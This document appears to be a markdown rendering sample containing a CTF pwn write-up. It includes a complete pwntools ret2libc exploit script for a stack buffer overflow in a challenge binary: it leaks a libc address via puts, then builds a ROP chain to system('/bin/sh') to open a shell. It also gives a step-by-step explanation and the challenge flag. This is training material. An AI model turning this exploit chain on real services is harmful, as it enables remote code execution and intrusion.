### Long block (should collapse at >30 lines)

```python
#!/usr/bin/env python3
from pwn import *
from ctypes import *

context.arch = 'amd64'
context.log_level = 'debug'

HOST = 'chall.ctf.local'
PORT = 9001

libc = ELF('./libc.so.6')
elf  = ELF('./vuln')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

def leak_libc(p):
    payload  = b'A' * 72
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])
    payload += p64(elf.got['puts'])
    p.sendlineafter(b'> ', payload)
    p.recvline()
    leak = u64(p.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    log.success(f'libc base: {hex(libc.address)}')

def get_shell(p):
    binsh   = next(libc.search(b'/bin/sh'))
    system  = libc.symbols['system']
    ret_gadget = 0x000000000040101a
    pop_rdi    = 0x0000000000401203

    payload  = b'A' * 72
    payload += p64(ret_gadget)
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(system)
    p.sendlineafter(b'> ', payload)

def main():
    p = conn()
    leak_libc(p)
    get_shell(p)
    p.interactive()

if __name__ == '__main__':
    main()
```

## Mixed Content Example

### Write-up: Stack Buffer Overflow

The binary has a classic stack BOF in `vuln()`. Running `checksec` confirms **No canary** and **No PIE**, so we only need to bypass **NX** with a ret2libc chain.

**Step 1 — find offset**

```python
from pwn import cyclic, cyclic_find
print(cyclic(100))
# crash at: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa...
offset = cyclic_find(0x6161616b)  # => 72
```

**Step 2 — leak libc base**

We use `puts@plt` to leak `puts@got`, then compute:

$$
\text{libc\_base} = \text{puts\_leak} - \text{puts\_offset}
$$

**Step 3 — ret2system**

```  
payload = b'A' * 72 | ret gadget | pop rdi | /bin/sh | system
```

Flag: `VinSOC{r3t2l1bc_1s_cl4ss1c_f0r_4_r34s0n}`
